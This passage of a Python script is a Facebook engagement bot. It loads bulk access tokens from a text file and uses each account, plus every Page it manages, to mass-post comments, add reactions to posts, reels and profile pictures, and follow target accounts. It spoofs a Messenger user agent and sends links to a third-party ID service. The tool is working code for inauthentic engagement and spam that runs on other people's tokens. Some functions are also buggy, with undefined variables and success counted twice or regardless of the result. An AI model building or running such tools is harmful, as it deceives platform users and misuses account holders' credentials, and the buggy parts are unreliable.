                    if total_comments_sent >= comment_limit:
                        print(f"{B}COMMENT LIMIT REACHED. SENT {total_comments_sent} COMMENTS.")
                        linex()
                        input(f"{B}PRESS ENTER TO GO BACK ")
                        main()
                        return
                else:
                    print(f"{B}FAILED TO POST COMMENT")
                    linex()
            except requests.exceptions.RequestException as error:
                print(f"{error}")

            try:
                response = requests.get(f'https://graph.facebook.com/me/accounts', headers={'Authorization': f'Bearer {access_token}'}).json()

                for page in response.get('data', []):
                    page_access_token = page.get('access_token', '')
                    page_name = page.get('name', '')

                    try:
                        url = f'https://graph.facebook.com/v18.0/{post_id}/comments'
                        headers = {
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-fb-friendly-name': 'fb_api_req_friendly_name',
                            'x-fb-http-engine': 'Liger',
                            'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
                        }
                        params = {'access_token': page_access_token, 'message': comment_text}
                        response = requests.post(url, params=params, headers=headers)

                        if response.status_code == 200:
                            total_comments_sent += 1
                            print(f"{G}SUCCESSFULLY COMMENTED USING FB PAGE!")
                            linex()
                            time.sleep(3)
                            if total_comments_sent >= comment_limit:
                                print(f"{R}COMMENT LIMIT REACHED. SENT {total_comments_sent} COMMENTS.")
                                linex()
                                input(f"{R}PRESS ENTER TO GO BACK ")
                                main()
                                return
                        else:
                            print(f"{B}FAILED TO POST COMMENT")
                            linex()
                    except requests.exceptions.RequestException as error:
                        print(f"{error}")
            except requests.exceptions.RequestException as error:
                print(f"{error}")

            comment_index += 1
    except KeyboardInterrupt:
        print(f"{B}OPERATION INTERRUPTED. EXITING...")
        time.sleep(2)

#######AUTO REACT REEL FB ACCOUNT########
def perform_reaction_acc_reel(reel_id, reaction_type, reaction_limit=1):
    total_reactions_sent = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            url = f'https://graph.facebook.com/v18.0/{reel_id}/reactions'
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-friendly-name': 'fb_api_req_friendly_name',
                'x-fb-http-engine': 'Liger',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
            }
            params = {'access_token': access_token, 'type': reaction_type}
            response = requests.post(url, params=params, headers=headers)

            if response.status_code == 200:
                total_reactions_sent += 1
                print(f"{R}SUCCESSFULLY REACTED! ")
                linex()
                time.sleep(2)
                if total_reactions_sent >= reaction_limit:
                    print(f"{B}REACTION LIMIT REACHED. SENT {total_reactions_sent} {reaction_type} REACTIONS.")
                    linex()
                    input(f"{B}PRESS ENTER TO GO BACK ")
                    main()
                    time.sleep(3)
                    return
            else:
                print(f"{B}FAILED TO POST REACTION  | {reel_id} ")
                linex()
    except requests.exceptions.RequestException as error:
        print(f"{error}")
#######AUTO REACT REEL PAGE########
def perform_reaction_page_reel(reel_id, reaction_type, reaction_limit=1):
    #os.system('clear')
    #print(logo_react)
    total_reactions_sent = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            response = requests.get(f'https://graph.facebook.com/me/accounts', headers={'Authorization': f'Bearer {access_token}'}).json()

            for page in response.get('data', []):
                page_access_token = page.get('access_token', '')
                page_name = page.get('name', '')

                try:
                    url = f'https://graph.facebook.com/v18.0/{reel_id}/reactions'
                    headers = {
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-friendly-name': 'fb_api_req_friendly_name',
                        'x-fb-http-engine': 'Liger',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
                    }
                    params = {'access_token': page_access_token, 'type': reaction_type}
                    response = requests.post(url, params=params, headers=headers)

                    if response.status_code == 200:
                        total_reactions_sent += 1
                        print(f"{R}SUCCESSFULLY REACTED! | {page_name} ")
                        linex()
                        time.sleep(3)
                        if total_reactions_sent >= reaction_limit:
                            print(f"{B}REACTION LIMIT REACHED. SENT {total_reactions_sent} {reaction_type} REACTION.")
                            linex()
                            input(f"{B}PRESS ENTER TO GO BACK ")
                            main()
                            return
                    else:
                        print(f"{R}FAILED TO POST REACTION  | {reel_id} ")
                        linex()
                except requests.exceptions.RequestException as error:
                    print(f"{error}")
    except requests.exceptions.RequestException as error:
        print(f"{error}")
#######AUTO REACT REEL MIX#######
def perform_reaction_mix_reel(reel_id, reaction_type, reaction_limit=1):
    #os.system('clear')
    #print(logo_react)
    total_reactions_sent = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            url = f'https://graph.facebook.com/v18.0/{reel_id}/reactions'
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-friendly-name': 'fb_api_req_friendly_name',
                'x-fb-http-engine': 'Liger',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
            }
            params = {'access_token': access_token, 'type': reaction_type}
            response = requests.post(url, params=params, headers=headers)

            if response.status_code == 200:
                total_reactions_sent += 1
                print(f"{R}SUCCESSFULLY REACTED WITH FB ACCOUNT! ")
                linex()
                time.sleep(2)
                if total_reactions_sent >= reaction_limit:
                    print(f"{B}REACTION LIMIT REACHED. SENT {total_reactions_sent} {reaction_type} REACTION.")
                    linex()
                    input(f"{B}PRESS ENTER TO GO BACK ")
                    main()
                    return
            else:
                print(f"{B}FAILED TO POST REACTION WITH FB ACCOUNT")
                linex()

            try:
                response = requests.get('https://graph.facebook.com/me/accounts', headers={'Authorization': f'Bearer {access_token}'}).json()

                for page in response.get('data', []):
                    page_access_token = page.get('access_token', '')
                    page_name = page.get('name', '')

                    url = f'https://graph.facebook.com/v18.0/{reel_id}/reactions'
                    headers = {
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-friendly-name': 'fb_api_req_friendly_name',
                        'x-fb-http-engine': 'Liger',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
                    }
                    params = {'access_token': page_access_token, 'type': reaction_type}
                    response = requests.post(url, params=params, headers=headers)

                    if response.status_code == 200:
                        total_reactions_sent += 1
                        print(f"{R}SUCCESSFULLY REACTED WITH FB PAGE! ")
                        linex()
                        time.sleep(3)
                        if total_reactions_sent >= reaction_limit:
                            print(f"{B}REACTION LIMIT REACHED. SENT {total_reactions_sent} {reaction_type} REACTION.")
                            linex()
                            input(f"{B}PRESS ENTER TO GO BACK ")
                            main()
                            return
                    else:
                        print(f"{N}FAILED TO POST REACTION  | {reel_id} ")
                        linex()
            except requests.exceptions.RequestException as error:
                print(f"{error}")
    except requests.exceptions.RequestException as error:
        print(f"{error}")
#######AUTO REACT ACCOUNT #######
def perform_reaction_acc(post_id, reaction_type, reaction_limit=1):
    #os.system('clear')
    #print(logo_react)
    total_reactions_sent = 0
    total_reactions_failed = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            url = f'https://graph.facebook.com/v18.0/{post_id}/reactions'
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-friendly-name': 'fb_api_req_friendly_name',
                'x-fb-http-engine': 'Liger',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
            }
            params = {'access_token': access_token, 'type': reaction_type}
            response = requests.post(url, params=params, headers=headers)

            if response.status_code == 200:
                total_reactions_sent += 1
                print(f"{R}SUCCESSFULLY REACTED! ")
                linex()
                time.sleep(2)
                if total_reactions_sent >= reaction_limit:
                    print(f"{R}TOTAL SUCCESSFUL: {total_reactions_sent}")
                    print(f"{R}TOTAL FAILED: {total_reactions_failed}")
                    linex()
                    input(f"{B}PRESS ENTER TO GO BACK ")
                    main()
                    break  # exit the loop after the reaction limit has been reached
            else:
                total_reactions_failed += 1
                print(f"{B}FAILED TO POST REACTION  | {post_id} ")
                linex()
    except requests.exceptions.RequestException as error:
        print(f"{error}")

#######AUTO REACT USING FB PAGE######
def perform_reaction(post_id, reaction_type, reaction_limit=1):
    #os.system('clear')
    #print(logo_react)
    total_reactions_sent = 0
    total_reactions_failed = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            try:
                response = requests.get(f'https://graph.facebook.com/me/accounts', headers={'Authorization': f'Bearer {access_token}'}).json()

                for page in response.get('data', []):
                    page_access_token = page.get('access_token', '')
                    page_name = page.get('name', '')

                    url = f'https://graph.facebook.com/v18.0/{post_id}/reactions'
                    headers = {
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-friendly-name': 'fb_api_req_friendly_name',
                        'x-fb-http-engine': 'Liger',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
                    }
                    params = {'access_token': page_access_token, 'type': reaction_type}
                    response = requests.post(url, params=params, headers=headers)

                    if response.status_code == 200:
                        total_reactions_sent += 1
                        print(f"{R}SUCCESSFULLY REACTED! | {page_name} ")
                        linex()
                        time.sleep(3)
                        if total_reactions_sent >= reaction_limit:
                            print(f"{R}TOTAL SUCCESSFUL: {total_reactions_sent}")
                            print(f"{B}TOTAL FAILED: {total_reactions_failed}")
                            linex()
                            input(f"{B}PRESS ENTER TO GO BACK ")
                            main()
                            return
                    else:
                        total_reactions_failed += 1
                        print(f"{B}FAILED TO POST REACTION  | {post_id} ")
                        linex()
            except requests.exceptions.RequestException as error:
                print(f"{error}")
    except requests.exceptions.RequestException as error:
        print(f"{error}")
######AUTO REACT USING FB ACCOUNT AND FB PAGE##### 
def perform_reaction_mix(post_id, reaction_type, reaction_limit=1):
    #os.system('clear')
    #print(logo_react)
    total_reactions_sent = 0
    total_reactions_failed = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            url = f'https://graph.facebook.com/v18.0/{post_id}/reactions'
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-friendly-name': 'fb_api_req_friendly_name',
                'x-fb-http-engine': 'Liger',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
            }
            params = {'access_token': access_token, 'type': reaction_type}
            response = requests.post(url, params=params, headers=headers)

            if response.status_code == 200:
                total_reactions_sent += 1
                print(f"{R}SUCCESSFULLY REACTED WITH FB ACCOUNT! ")
                linex()
                time.sleep(2)
                if total_reactions_sent >= reaction_limit:
                    print(f"{R}TOTAL SUCCESSFUL: {total_reactions_sent}")
                    print(f"{B}TOTAL FAILED: {total_reactions_failed}")
                    linex()
                    input(f"{B}PRESS ENTER TO GO BACK ")
                    main()
                    return
            else:
                total_reactions_failed += 1
                print(f"{B}FAILED TO POST REACTION WITH FB ACCOUNT")
                linex()

            try:
                response = requests.get('https://graph.facebook.com/me/accounts', headers={'Authorization': f'Bearer {access_token}'}).json()

                for page in response.get('data', []):
                    page_access_token = page.get('access_token', '')
                    page_name = page.get('name', '')

                    try:
                        url = f'https://graph.facebook.com/v18.0/{post_id}/reactions'
                        headers = {
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-fb-friendly-name': 'fb_api_req_friendly_name',
                            'x-fb-http-engine': 'Liger',
                            'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
                        }
                        params = {'access_token': page_access_token, 'type': reaction_type}
                        response = requests.post(url, params=params, headers=headers)

                        if response.status_code == 200:
                            total_reactions_sent += 1
                            print(f"{R}SUCCESSFULLY REACTED WITH FB PAGE! ")
                            linex()
                            time.sleep(3)
                            if total_reactions_sent >= reaction_limit:
                                print(f"{R}TOTAL SUCCESSFUL: {total_reactions_sent}")
                                print(f"{B}TOTAL FAILED: {total_reactions_failed}")
                                linex()
                                input(f"{B}PRESS ENTER TO GO BACK ")
                                main()
                                return
                        else:
                            total_reactions_failed += 1
                            print(f"{B}FAILED TO POST REACTION  | {post_id} ")
                            linex()
                    except requests.exceptions.RequestException as error:
                        print(f"{error}")
            except requests.exceptions.RequestException as error:
                print(f"{error}")
    except requests.exceptions.RequestException as error:
        print(f"{error}")
######AUTO REACTION DP AND COVER######
def perform_reaction_acc_dp_cover(post_id, reaction_type, reaction_limit=1):
    #os.system('clear')
    #print(logo_react)
    total_reactions_sent = 0
    total_reactions_failed = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            url = f'https://graph.facebook.com/v18.0/{post_id}/reactions'
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-friendly-name': 'fb_api_req_friendly_name',
                'x-fb-http-engine': 'Liger',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
            }
            params = {'access_token': access_token, 'type': reaction_type}
            response = requests.post(url, params=params, headers=headers)

            if response.status_code == 200:
                total_reactions_sent += 1
                print(f"{R}SUCCESSFULLY REACTED! ")
                linex()
                time.sleep(2)
                if total_reactions_sent >= reaction_limit:
                    print(f"{R}TOTAL SUCCESSFUL: {total_reactions_sent}")
                    print(f"{B}TOTAL FAILED: {total_reactions_failed}")
                    linex()
                    input(f"{B}PRESS ENTER TO GO BACK ")
                    main()
                    break  # exit the loop after the reaction limit has been reached
            else:
                total_reactions_failed += 1
                print(f"{B}FAILED TO POST REACTION  | {post_id} ")
                linex()
    except requests.exceptions.RequestException as error:
        print(f"{error}")
########
def perform_reaction_pg_dp_cover(post_id, reaction_type, reaction_limit=1):
    #os.system('clear')
    #print(logo_react)
    total_reactions_sent = 0
    total_reactions_failed = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            try:
                response = requests.get(f'https://graph.facebook.com/me/accounts', headers={'Authorization': f'Bearer {access_token}'}).json()

                for page in response.get('data', []):
                    page_access_token = page.get('access_token', '')
                    page_name = page.get('name', '')

                    url = f'https://graph.facebook.com/v18.0/{post_id}/reactions'
                    headers = {
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-friendly-name': 'fb_api_req_friendly_name',
                        'x-fb-http-engine': 'Liger',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
                    }
                    params = {'access_token': page_access_token, 'type': reaction_type}
                    response = requests.post(url, params=params, headers=headers)

                    if response.status_code == 200:
                        total_reactions_sent += 1
                        print(f"{R}SUCCESSFULLY REACTED! | {page_name} ")
                        linex()
                        time.sleep(3)
                        if total_reactions_sent >= reaction_limit:
                            print(f"{R}TOTAL SUCCESSFUL: {total_reactions_sent}")
                            print(f"{B}TOTAL FAILED: {total_reactions_failed}")
                            linex()
                            input(f"{B}PRESS ENTER TO GO BACK ")
                            main()
                            return
                    else:
                        total_reactions_failed += 1
                        print(f"{B}FAILED TO POST REACTION  | {post_id} ")
                        linex()
            except requests.exceptions.RequestException as error:
                print(f"{error}")
    except requests.exceptions.RequestException as error:
        print(f"{error}")
#######
def perform_reaction_mix_dp_cover(post_id, reaction_type, reaction_limit=1):
    #os.system('clear')
    #print(logo_react)
    total_reactions_sent = 0
    total_reactions_failed = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            url = f'https://graph.facebook.com/v18.0/{post_id}/reactions'
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-friendly-name': 'fb_api_req_friendly_name',
                'x-fb-http-engine': 'Liger',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
            }
            params = {'access_token': access_token, 'type': reaction_type}
            response = requests.post(url, params=params, headers=headers)

            if response.status_code == 200:
                total_reactions_sent += 1
                print(f"{R}SUCCESSFULLY REACTED WITH FB ACCOUNT! ")
                linex()
                time.sleep(2)
                if total_reactions_sent >= reaction_limit:
                    print(f"{R}TOTAL SUCCESSFUL: {total_reactions_sent}")
                    print(f"{B}TOTAL FAILED: {total_reactions_failed}")
                    linex()
                    input(f"{B}PRESS ENTER TO GO BACK ")
                    main()
                    return
            else:
                total_reactions_failed += 1
                print(f"{B}FAILED TO POST REACTION WITH FB ACCOUNT")
                linex()

            try:
                response = requests.get('https://graph.facebook.com/me/accounts', headers={'Authorization': f'Bearer {access_token}'}).json()

                for page in response.get('data', []):
                    page_access_token = page.get('access_token', '')
                    page_name = page.get('name', '')

                    try:
                        url = f'https://graph.facebook.com/v18.0/{post_id}/reactions'
                        headers = {
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-fb-friendly-name': 'fb_api_req_friendly_name',
                            'x-fb-http-engine': 'Liger',
                            'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
                        }
                        params = {'access_token': page_access_token, 'type': reaction_type}
                        response = requests.post(url, params=params, headers=headers)

                        if response.status_code == 200:
                            total_reactions_sent += 1
                            print(f"{G}SUCCESSFULLY REACTED WITH FB PAGE! ")
                            linex()
                            time.sleep(3)
                            if total_reactions_sent >= reaction_limit:
                                print(f"{G}TOTAL SUCCESSFUL: {total_reactions_sent}")
                                print(f"{B}TOTAL FAILED: {total_reactions_failed}")
                                linex()
                                input(f"{R}PRESS ENTER TO GO BACK ")
                                main()
                                return
                        else:
                            total_reactions_failed += 1
                            print(f"{B}FAILED TO POST REACTION  | {post_id} ")
                            linex()
                    except requests.exceptions.RequestException as error:
                        print(f"{error}")
            except requests.exceptions.RequestException as error:
                print(f"{error}")
    except requests.exceptions.RequestException as error:
        print(f"{error}")
#######
def get_photo_id(url):
    match = re.search(r'facebook.com/photo.php\?fbid=(\d+)', url)
    if match:
        return match.group(1)
    else:
        return None
########
def get_reel_id(url):
    match = re.search(r'facebook.com/reel/(\d+)', url)
    if match:
        return match.group(1)
    else:
        return None
###########EXTRACTION#$$
def extract_ids(url):
    group_pattern = r'groups/(\d+)/permalink/(\d+)/'
    post_pattern = r'(\d+)/posts/(\d+)/'
    photo_pattern = r'fbid=(\d+)'

    group_match = re.search(group_pattern, url)
    post_match = re.search(post_pattern, url)
    photo_match = re.search(photo_pattern, url)

    if group_match:
        group_id, post_id = group_match.groups()
        return f"{group_id}_{post_id}"
    elif post_match:
        group_id, post_id = post_match.groups()
        return f"{group_id}_{post_id}"
    elif photo_match:
        photo_id = photo_match.group(1)
        return photo_id
    else:
        return None
#########EXTRACTOR#######      
def get_user_id(url):
    match = re.search(r'facebook.com/(\d+)/', url)
    if match:
        return match.group(1)
    else:
        return None

def is_post_id(url):
    response = requests.post('https://id.traodoisub.com/api.php', data={'link': url})
    post_id_link = response.json().get('id')
    return post_id_link

def extract_facebook_post_info(url):
    post_id = is_post_id(url)
    user_id = get_user_id(url)

    if post_id:
        return f'https://www.facebook.com/{user_id}/posts/{post_id}/?mibextid=rS40aB7S9Ucbxw6v'
########AUTO FOLLOW USING FB PAGE#########
def follow_pages(account_id, num_pages=1):
    #os.system('clear')
    #print(logo_follow)
    follow_counter = 0
    failed_counter = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            headers = {
                'Authorization': f'Bearer {access_token}'
            }
            scope = [
                'public_profile', 'email', 'user_friends', 'user_likes', 'user_photos',
                'user_videos', 'user_status', 'user_posts', 'user_tagged_places', 'user_hometown',
                'user_location', 'user_work_history', 'user_education_history', 'user_groups',
                'publish_pages', 'manage_pages'
            ]

            data = {
                'scope': ','.join(scope)
            }

            try:
                response = requests.get('https://graph.facebook.com/v18.0/me/accounts', headers=headers, params=data)
                pages_data = response.json().get('data', [])
                for i, page in enumerate(pages_data):
                    if follow_counter >= num_pages:
                        print(f"{R}TOTAL SUCCESSFUL: {follow_counter}")
                        print(f"{B}TOTAL FAILED: {failed_counter}")
                        linex()
                        input(f"{R}PRESS ENTER TO GO BACK ")
                        main()
                        return
                    page_access_token = page.get('access_token', '')
                    page_name = page.get('name', '')

                    try:
                        response = requests.post(f'https://graph.facebook.com/{account_id}/subscribers', headers={'Authorization': f'Bearer {access_token}'})
                        if response.status_code == 200:
                            follow_counter += 1
                            print(f"{R}SUCCESSFULLY FOLLOWED! | {account_data.get('name', '')} | {account_id_to_follow}")
                            linex()
                            time.sleep(2)
                            follow_counter += 1
                        else:
                            failed_counter += 1
                            print(f"{B}FAILED TO FOLLOW! | {account_data.get('name', '')} | {account_id_to_follow}")
                            linex()
                    except requests.exceptions.RequestException as error:
                        print(f"{B}{error}")
            except requests.exceptions.RequestException as error:
                print(f"{B}{error}")
    except requests.exceptions.RequestException as error:
        print(f"{B}{error}")

######FOLLOW USING ACCOUNT #####
def follow_accounts(account_id, num_accounts=1):
    follow_counter = 0
    failed_counter = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            headers = {
                'Authorization': f'Bearer {access_token}'
            }

            try:
                response = requests.get('https://graph.facebook.com/me', headers=headers)
                account_data = response.json()
                account_id_to_follow = account_data.get('id', '')

                if follow_counter >= num_accounts:
                    print(f"{R}TOTAL SUCCESSFUL: {follow_counter}")
                    print(f"{B}TOTAL FAILED: {failed_counter}")
                    linex()
                    input(f"{B}PRESS ENTER TO GO BACK ")
                    main()
                    return

                try:
                    response = requests.post(f'https://graph.facebook.com/{account_id}/subscribers', headers={'Authorization': f'Bearer {access_token}'})
                    if response.status_code == 200:
                        follow_counter += 1
                        print(f"{R}SUCCESSFULLY FOLLOWED! | {account_data.get('name', '')} | {account_id_to_follow}")
                        linex()
                        time.sleep(2)
                        follow_counter += 1
                    else:
                        failed_counter += 1
                        print(f"{B}FAILED TO FOLLOW! | {account_data.get('name', '')} | {account_id_to_follow}")
                        linex()
                except requests.exceptions.RequestException as error:
                    print(f"{B}{error}")
            except requests.exceptions.RequestException as error:
                print(f"{B}{error}")
    except Exception as e:
        print(f"An error occurred: {e}")

#######AUTO FOLLOW USING FB PAGE AND FB ACCOUNT #######
def follow_accounts_mix(account_id, num_accounts=1):
    follow_counter = 0
    failed_counter = 0
    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            headers = {
                'Authorization': f'Bearer {access_token}'
            }

            try:
                response = requests.get('https://graph.facebook.com/me', headers=headers)
                account_data = response.json()
                account_id_to_follow = account_data.get('id', '')

                if follow_counter >= num_accounts:
                    print(f"{R}TOTAL SUCCESSFUL: {follow_counter}")
                    print(f"{B}TOTAL FAILED: {failed_counter}")
                    linex()
                    input(f"{B}PRESS ENTER TO GO BACK ")
                    main()
                    return

                try:
                    response = requests.post(f'https://graph.facebook.com/{account_id}/subscribers', headers={'Authorization': f'Bearer {access_token}'})
                    print(f"{R}SUCCESSFULLY FOLLOWED USING FB ACCOUNT!")
                    linex()
                    time.sleep(2)
                    follow_counter += 1
                except:
                    failed_counter += 1
                    print(f"{B}FAILED TO FOLLOW USING FB ACCOUNT!")
                    linex()

            except requests.exceptions.RequestException as error:
                print(f"{B}{error}")

            scope = [
                'public_profile', 'email', 'user_friends', 'user_likes', 'user_photos',
                'user_videos', 'user_status', 'user_posts', 'user_tagged_places', 'user_hometown',
                'user_location', 'user_work_history', 'user_education_history', 'user_groups',
                'publish_pages', 'manage_pages'
            ]

            data = {
                'scope': ','.join(scope)
            }

            try:
                response = requests.get('https://graph.facebook.com/v18.0/me/accounts', headers=headers, params=data)
                pages_data = response.json().get('data', [])
                for i, page in enumerate(pages_data):
                    if follow_counter >= num_accounts:
                        print(f"{R}TOTAL SUCCESSFUL: {follow_counter}")
                        print(f"{B}TOTAL FAILED: {failed_counter}")
                        linex()
                        input(f"{B}PRESS ENTER TO GO BACK ")
                        main()
                        return
                    page_access_token = page.get('access_token', '')
                    page_name = page.get('name', '')

                    try:
                        response = requests.post(f'https://graph.facebook.com/v18.0/{account_id}/subscribers', headers={'Authorization': f'Bearer {page_access_token}'})
                        print(f"{R}SUCCESSFULLY FOLLOWED USING FB PAGE! ")
                        linex()
                        time.sleep(2)
                        follow_counter += 1
                    except:
                        failed_counter += 1
                        print(f"{B}FAILED TO FOLLOW USING FB ACCOUNT!")
                        linex()
            except requests.exceptions.RequestException as error:
                print(f"{B}{error}")
    except:
        print(f"{B}Error occurred while following accounts. Please check the input parameters and try again.")
main()